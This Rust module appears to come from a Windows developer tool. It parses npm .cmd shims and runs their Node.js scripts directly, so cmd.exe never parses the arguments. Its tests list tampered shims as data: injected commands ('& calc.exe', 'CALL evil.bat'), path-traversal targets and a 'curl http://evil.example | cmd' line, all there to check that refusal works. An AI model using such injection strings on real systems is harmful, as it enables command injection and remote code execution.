//! Node CLI shims (`tsc.cmd`, `eslint.cmd`, `vite.cmd`, `pnpm.cmd`...) run without a shell (card OA7-01, TM-10).
//!
//! On Windows npm writes a `.cmd` file for every command a package installs: in `node_modules\.bin` of a project and in the folder of the global prefix (`%APPDATA%\npm`). A `.cmd` is a
//! batch file, and `cmd.exe`, which would run it, parses the arguments itself: that is how commands were smuggled into programs started with text from outside (BatBadBut). So a `.cmd`
//! is never started. What an npm shim does is one thing, `node <script> <arguments>`, and it says in one line which script. This module reads that line from a file that is exactly what npm
//! writes (the same lines, in a short list, around the one that starts Node.js; anything else is refused), checks that the script is a file inside the same `node_modules`, and gives back
//! `node.exe` and the script, which `term.run` starts as it starts `npm` (the question still shows the name the caller gave and the real command).
//!
//! `mvn`, `gradle`, `mvnw` and `gradlew` are batch files that really are scripts, and stay refused (see `rules::batch_only_tool`).

use super::rules::{batch_only_note, classify_exe, resolve_exe, TermConfig};
use crate::fs::guard::{canonical, expand_env, within};
use aqua_tool_host::{ErrorCode, ToolError};
use std::path::{Path, PathBuf};

/// A shim file is a few hundred bytes; one that is bigger is not one npm wrote.
const MAX_SHIM_BYTES: u64 = 8 * 1024;

/// How far up from the working folder `node_modules\.bin` folders are looked for (a project inside a workspace of packages has its tools in the folder above).
const MAX_LEVELS_UP: usize = 12;

/// The lines npm writes around the one that starts Node.js (compared whole, without regard to case, after trimming): they find the folder of the shim, look for a `node.exe` next to it
/// and start nothing. A shim with any other line (a `SET NODE_PATH=...`, a `CALL`, a second command) is not run.
const BOILERPLATE: &[&str] = &[
    "@echo off",
    "goto start",
    ":find_dp0",
    "set dp0=%~dp0",
    "exit /b",
    ":start",
    "setlocal",
    "call :find_dp0",
    "if exist \"%dp0%\\node.exe\" (",
    "set \"_prog=%dp0%\\node.exe\"",
    ") else (",
    "set \"_prog=node\"",
    "set pathext=%pathext:;.js;=;%",
    ")",
    // The shims of npm 6 and older.
    "@if exist \"%~dp0\\node.exe\" (",
    "@setlocal",
    "@set pathext=%pathext:;.js;=;%",
];

/// What starts Node.js in a shim (compared without regard to case): the line of the shims since npm 7 (it ends the batch run and starts the program as its last act, so that Ctrl+C does
/// not ask "Terminate batch job?"), and the two lines of the older ones.
const LAUNCH_PREFIXES: &[&str] = &["endlocal & goto #_undefined_# 2>nul || title %comspec% & \"%_prog%\"", "\"%~dp0\\node.exe\"", "node"];

/// Where the script a shim names is, from the folder of the shim.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Base {
    /// `%dp0%\..\<package>\...`: the shim is in `node_modules\.bin` and the script in `node_modules\<package>`.
    ProjectBin,
    /// `%dp0%\node_modules\<package>\...`: the shim is in the folder of the global prefix, next to its own `node_modules`.
    GlobalPrefix,
}

/// The script a shim starts: where it starts counting, and the names after that (`["typescript", "bin", "tsc"]`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShimTarget {
    pub base: Base,
    pub segments: Vec<String>,
}

/// Read what a shim file says, or why it is not a shim that npm wrote (the reason names the line, never its text).
pub fn parse_shim(text: &str) -> Result<ShimTarget, String> {
    let mut target: Option<ShimTarget> = None;
    for (at, raw) in text.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || BOILERPLATE.iter().any(|b| b.eq_ignore_ascii_case(line)) {
            continue;
        }
        let found = launch_target(line).ok_or_else(|| format!("line {} is not one that npm writes in a shim", at + 1))?;
        match &target {
            Some(first) if *first != found => return Err(format!("line {} names a different script than the line before it", at + 1)),
            _ => target = Some(found),
        }
    }
    target.ok_or_else(|| "it has no line that starts Node.js".to_string())
}

/// The script named by a line that starts Node.js: `<start> "<target>" %*`, where `<start>` is one of [`LAUNCH_PREFIXES`] and `<target>` the path of the script from the shim's folder.
fn launch_target(line: &str) -> Option<ShimTarget> {
    let lower = line.to_ascii_lowercase();
    let prefix = LAUNCH_PREFIXES.iter().find(|p| lower.starts_with(**p))?;
    // The text after the start of the line: `  "%dp0%\..\typescript\bin\tsc" %*`. (`node` must be followed by a space: `nodemon` is not it.)
    let rest = &line[prefix.len()..];
    if !rest.starts_with(' ') {
        return None;
    }
    let rest = rest.trim_start_matches(' ').strip_prefix('"')?;
    let (target, after) = rest.split_once('"')?;
    if after != " %*" {
        return None;
    }
    parse_target(target)
}

/// `%dp0%\..\typescript\bin\tsc` or `%~dp0\node_modules\pyright\index.js`: a folder variable, one of two ways to go on from it, and then plain names. A name is letters, digits and
/// `. _ - @ +` (the `@` is for `@scope\package`); it is never empty, `.` or `..`; the last one is a script (`.js`, `.cjs`, `.mjs`) or has no extension at all, as many `bin` files do not.
fn parse_target(target: &str) -> Option<ShimTarget> {
    let rest = target.strip_prefix("%dp0%\\").or_else(|| target.strip_prefix("%~dp0\\"))?;
    let (base, names) = if let Some(names) = rest.strip_prefix("..\\") {
        (Base::ProjectBin, names)
    } else if let Some(names) = rest.strip_prefix("node_modules\\") {
        (Base::GlobalPrefix, names)
    } else {
        return None;
    };
    let segments: Vec<String> = names.split('\\').map(str::to_string).collect();
    let plain = |s: &str| !s.is_empty() && s != "." && s != ".." && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@' | '+'));
    if segments.len() < 2 || !segments.iter().all(|s| plain(s)) {
        return None;
    }
    let last = segments.last()?;
    let script_like = match last.rsplit_once('.') {
        Some((stem, ext)) if !stem.is_empty() => matches!(ext.to_ascii_lowercase().as_str(), "js" | "cjs" | "mjs"),
        _ => true,
    };
    script_like.then_some(ShimTarget { base, segments })
}

/// The script file a shim at `shim` names: it has to be there, be a file, and be inside the same `node_modules` as the shim (after links are followed), whatever the shim says.
pub fn script_of(shim: &Path, target: &ShimTarget) -> Result<PathBuf, String> {
    let dir = shim.parent().ok_or("the shim has no folder")?;
    let modules = match target.base {
        Base::ProjectBin => {
            // `<project>\node_modules\.bin\tsc.cmd`: the folder is `.bin` and its parent is `node_modules`.
            let named = |p: &Path, n: &str| p.file_name().is_some_and(|f| f.eq_ignore_ascii_case(n));
            let parent = dir.parent().ok_or("the shim is not in a node_modules\\.bin folder")?;
            if !named(dir, ".bin") || !named(parent, "node_modules") {
                return Err("the shim names a script next to its own folder, and it is not in a node_modules\\.bin folder".into());
            }
            parent.to_path_buf()
        }
        Base::GlobalPrefix => dir.join("node_modules"),
    };
    let modules = canonical(&modules).map_err(|_| format!("{} was not found", modules.display()))?;
    let mut script = modules.clone();
    for s in &target.segments {
        script.push(s);
    }
    let script = canonical(&script).map_err(|_| format!("the script the shim names ({}) was not found", script.display()))?;
    if !script.is_file() {
        return Err(format!("the script the shim names ({}) is not a file", script.display()));
    }
    if !within(&script, &modules) {
        return Err(format!("the script the shim names resolves to {}, which is not inside {}", script.display(), modules.display()));
    }
    Ok(script)
}

/// The `node_modules\.bin` folders from `cwd` up to `root` (nearest first), as far as they exist.
pub fn project_bin_dirs(cwd: &Path, root: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mut at = Some(cwd.to_path_buf());
    for _ in 0..MAX_LEVELS_UP {
        let Some(dir) = at else { break };
        if !within(&dir, root) {
            break;
        }
        let bin = dir.join("node_modules").join(".bin");
        if bin.is_dir() {
            out.push(bin);
        }
        at = dir.parent().map(Path::to_path_buf);
    }
    out
}

/// The name of a command as a file name of a shim: a bare name of plain characters, without `.cmd`. `None` for a path, an odd character, or a name with `..`.
fn shim_name(name: &str) -> Option<String> {
    let name = name.trim();
    let lower = name.to_ascii_lowercase();
    let base = lower.strip_suffix(".cmd").unwrap_or(&lower);
    let plain = !base.is_empty() && !base.contains("..") && base.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@' | '+'));
    plain.then(|| base.to_string())
}

/// Run `name` as a Node CLI shim, if it is one. The caller has already found that `name` is no program that can run (no `.exe` of that name, or a name that ends in `.cmd`): this is
/// only asked then, so an ordinary program always wins over a shim. `None` when `name` is not the name of a shim that is there (the ordinary refusal stands), `Some(Err)` when a shim is
/// there and is refused (it is not what npm writes, its script is not where it says, or Node.js is missing), `Some(Ok((node.exe, script)))` when it can run.
///
/// `project_bins` are the `node_modules\.bin` folders of the working folder, nearest first; then come the program folders of `term.json` and the folder of the global prefix of npm.
pub fn resolve(cfg: &TermConfig, name: &str, project_bins: &[PathBuf]) -> Option<Result<(PathBuf, PathBuf), ToolError>> {
    if name.contains(['/', '\\', ':']) {
        return None;
    }
    let base = shim_name(name)?;
    // A name that is not allowed to run at all is not looked for as a shim, and Maven and Gradle are batch files whatever is written next to them.
    if let Err(e) = classify_exe(&base) {
        return Some(Err(e));
    }
    if let Some(note) = batch_only_note(&base) {
        return Some(Err(ToolError::new(ErrorCode::PermissionDenied, format!("'{base}' cannot be run through term tools.{note}"))));
    }
    let file = format!("{base}.cmd");
    let mut dirs: Vec<PathBuf> = project_bins.to_vec();
    dirs.extend(cfg.path_dirs.iter().map(|d| PathBuf::from(expand_env(d))));
    dirs.push(PathBuf::from(expand_env("%APPDATA%/npm")));
    let shim = dirs.iter().map(|d| d.join(&file)).find(|p| p.is_file())?;
    Some(run_through_node(cfg, &base, &shim))
}

fn run_through_node(cfg: &TermConfig, name: &str, shim: &Path) -> Result<(PathBuf, PathBuf), ToolError> {
    let refused = |why: String| {
        ToolError::new(
            ErrorCode::PermissionDenied,
            format!(
                "{name}.cmd ({}) is not run: term tools never start a .cmd file (cmd.exe would parse the arguments), and run the Node.js script of a shim only when the file is exactly what npm writes: {why}",
                shim.display()
            ),
        )
    };
    let size = std::fs::metadata(shim).map_err(|e| refused(format!("it cannot be read ({e})")))?.len();
    if size > MAX_SHIM_BYTES {
        return Err(refused(format!("it is {size} bytes, and a shim is a few hundred")));
    }
    let bytes = std::fs::read(shim).map_err(|e| refused(format!("it cannot be read ({e})")))?;
    let text = String::from_utf8(bytes).map_err(|_| refused("it is not text".into()))?;
    let target = parse_shim(&text).map_err(refused)?;
    let script = script_of(shim, &target).map_err(refused)?;
    let node = resolve_exe(cfg, "node").map_err(|_| ToolError::new(ErrorCode::NotFound, format!("'{name}' needs Node.js, and node.exe was not found in: {}", cfg.path_dirs.join(", "))))?;
    Ok((node, script))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// What npm 7 and later writes for `tsc` in `node_modules\.bin` (read from a real project; CRLF line ends).
    fn npm_shim(target: &str) -> String {
        [
            "@ECHO off",
            "GOTO start",
            ":find_dp0",
            "SET dp0=%~dp0",
            "EXIT /b",
            ":start",
            "SETLOCAL",
            "CALL :find_dp0",
            "",
            "IF EXIST \"%dp0%\\node.exe\" (",
            "  SET \"_prog=%dp0%\\node.exe\"",
            ") ELSE (",
            "  SET \"_prog=node\"",
            "  SET PATHEXT=%PATHEXT:;.JS;=;%",
            ")",
            "",
            &format!("endLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & \"%_prog%\"  \"{target}\" %*"),
            "",
        ]
        .join("\r\n")
    }

    /// What npm 6 and older write.
    fn old_npm_shim(target: &str) -> String {
        format!("@IF EXIST \"%~dp0\\node.exe\" (\r\n  \"%~dp0\\node.exe\"  \"{target}\" %*\r\n) ELSE (\r\n  @SETLOCAL\r\n  @SET PATHEXT=%PATHEXT:;.JS;=;%\r\n  node  \"{target}\" %*\r\n)\r\n")
    }

    #[test]
    fn a_shim_that_npm_wrote_is_read_for_the_script_it_names() {
        let t = parse_shim(&npm_shim("%dp0%\\..\\typescript\\bin\\tsc")).unwrap();
        assert_eq!(t, ShimTarget { base: Base::ProjectBin, segments: vec!["typescript".into(), "bin".into(), "tsc".into()] });
        // The global kind, with a script that has an extension, and a scoped package.
        let g = parse_shim(&npm_shim("%dp0%\\node_modules\\pyright\\index.js")).unwrap();
        assert_eq!(g, ShimTarget { base: Base::GlobalPrefix, segments: vec!["pyright".into(), "index.js".into()] });
        assert_eq!(parse_shim(&npm_shim("%dp0%\\..\\@scope\\tool\\bin\\run.cjs")).unwrap().segments, ["@scope", "tool", "bin", "run.cjs"]);
        // LF line ends, and the older shapes (both launch lines name the same script).
        assert!(parse_shim(&npm_shim("%dp0%\\..\\vite\\bin\\vite.js").replace("\r\n", "\n")).is_ok());
        assert_eq!(parse_shim(&old_npm_shim("%~dp0\\..\\typescript\\bin\\tsc")).unwrap().segments, ["typescript", "bin", "tsc"]);
    }

    #[test]
    fn a_modified_shim_is_refused() {
        let good = npm_shim("%dp0%\\..\\typescript\\bin\\tsc");
        // A command added to the shim, anywhere: before, after, or on the line that starts Node.js.
        for evil in [
            format!("calc.exe\r\n{good}"),
            format!("{good}calc.exe\r\n"),
            good.replace("SETLOCAL", "SETLOCAL\r\nSET NODE_OPTIONS=--require x.js"),
            good.replace("%*", "%* & calc.exe"),
            good.replace("%*", "%* && calc"),
            good.replace("CALL :find_dp0", "CALL evil.bat"),
            good.replace("  SET \"_prog=node\"", "  SET \"_prog=calc.exe\""),
            good.replace("\"%_prog%\"  \"%dp0%", "\"%_prog%\" --require \"%dp0%\\..\\x.js\" \"%dp0%"),
            good.replace("endLocal & goto", "start calc & endLocal & goto"),
        ] {
            assert!(parse_shim(&evil).is_err(), "{evil}");
        }
        // A script that is not under node_modules, one that is a shell or another kind of file, an environment variable, a quote or a metacharacter in the name, an empty or dot name.
        for target in [
            "%dp0%\\..\\..\\..\\Windows\\System32\\calc.exe",
            "%dp0%\\..\\typescript\\..\\..\\x.js",
            "%dp0%\\..\\typescript\\bin\\tsc.cmd",
            "%dp0%\\..\\typescript\\bin\\tsc.exe",
            "%dp0%\\..\\typescript\\bin\\tsc.ps1",
            "%dp0%\\..\\typescript\\bin\\%COMSPEC%",
            "%dp0%\\..\\typescript\\bin\\a&calc",
            "%dp0%\\..\\typescript\\bin\\a b.js",
            "%dp0%\\..\\typescript\\\\tsc",
            "%dp0%\\..\\.\\tsc",
            "%dp0%\\..\\tsc",
            "%dp0%\\typescript\\bin\\tsc",
            "C:\\Windows\\System32\\calc.exe",
            "%dp0%\\node_modules\\..\\..\\x.js",
            "%USERPROFILE%\\evil.js",
            "\\\\server\\share\\x.js",
        ] {
            assert!(parse_shim(&npm_shim(target)).is_err(), "{target}");
        }
        // The two launch lines of an old shim must name the same script.
        assert!(parse_shim(&old_npm_shim("%~dp0\\..\\a\\bin\\a").replacen("%~dp0\\..\\a\\bin\\a", "%~dp0\\..\\b\\bin\\b", 1)).is_err());
        // Nothing at all, or no line that starts Node.js.
        assert!(parse_shim("").is_err() && parse_shim("@ECHO off\r\n").is_err());
        // `nodemon` is not `node`.
        assert!(parse_shim("nodemon  \"%~dp0\\..\\x\\y.js\" %*").is_err());
        // The reason names a line, never its text.
        let why = parse_shim(&format!("{good}curl http://evil.example | cmd\r\n")).unwrap_err();
        assert!(why.starts_with("line ") && !why.contains("evil"), "{why}");
    }

    /// A project folder with the files of a package `pkg` and a shim for it.
    fn project(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("aqua_shim_{name}_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("node_modules").join(".bin")).unwrap();
        std::fs::create_dir_all(dir.join("node_modules").join("pkg").join("bin")).unwrap();
        std::fs::write(dir.join("node_modules").join("pkg").join("bin").join("cli.js"), "console.log('cli')").unwrap();
        std::fs::write(dir.join("outside.js"), "").unwrap();
        dir
    }

    #[test]
    fn the_script_of_a_shim_is_a_file_inside_the_same_node_modules() {
        let dir = project("script_of");
        let shim = dir.join("node_modules").join(".bin").join("pkg.cmd");
        let ok = parse_shim(&npm_shim("%dp0%\\..\\pkg\\bin\\cli.js")).unwrap();
        let script = script_of(&shim, &ok).unwrap();
        assert!(script.ends_with("cli.js") && script.is_file());
        // Not there, or a folder.
        let missing = parse_shim(&npm_shim("%dp0%\\..\\pkg\\bin\\nope.js")).unwrap();
        assert!(script_of(&shim, &missing).unwrap_err().contains("was not found"));
        let folder = parse_shim(&npm_shim("%dp0%\\..\\pkg\\bin")).unwrap();
        assert!(script_of(&shim, &folder).is_err());
        // A shim that is not in a `node_modules\.bin` folder cannot name a script next to its folder.
        let elsewhere = dir.join("pkg.cmd");
        assert!(script_of(&elsewhere, &ok).unwrap_err().contains("node_modules"));
        // The global kind needs `node_modules` next to the shim.
        let global = parse_shim(&npm_shim("%dp0%\\node_modules\\pkg\\bin\\cli.js")).unwrap();
        assert!(script_of(&dir.join("pkg.cmd"), &global).unwrap().ends_with("cli.js"));
        assert!(script_of(&dir.join("node_modules").join("pkg.cmd"), &global).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_project_bin_folders_are_found_from_the_working_folder_up_to_its_root() {
        let dir = project("bins");
        let nested = dir.join("packages").join("app");
        std::fs::create_dir_all(nested.join("node_modules").join(".bin")).unwrap();
        let found = project_bin_dirs(&nested, &dir);
        assert_eq!(found, vec![nested.join("node_modules").join(".bin"), dir.join("node_modules").join(".bin")]);
        // Never above the root.
        assert_eq!(project_bin_dirs(&nested, &nested), vec![nested.join("node_modules").join(".bin")]);
        assert!(project_bin_dirs(&dir.join("packages"), &dir.join("packages").join("app")).is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_name_is_looked_for_as_a_shim_only_when_it_is_a_plain_name() {
        for odd in ["", "..", "a/b", "a\\b", "C:\\x\\tsc.cmd", "tsc;calc", "ts c", "tsc%", "a..b"] {
            assert!(shim_name(odd).is_none() || odd.is_empty(), "{odd}");
        }
        assert_eq!(shim_name("TSC.CMD").unwrap(), "tsc");
        assert_eq!(shim_name("eslint").unwrap(), "eslint");
        assert_eq!(shim_name("@scope-tool").unwrap(), "@scope-tool");
    }
}
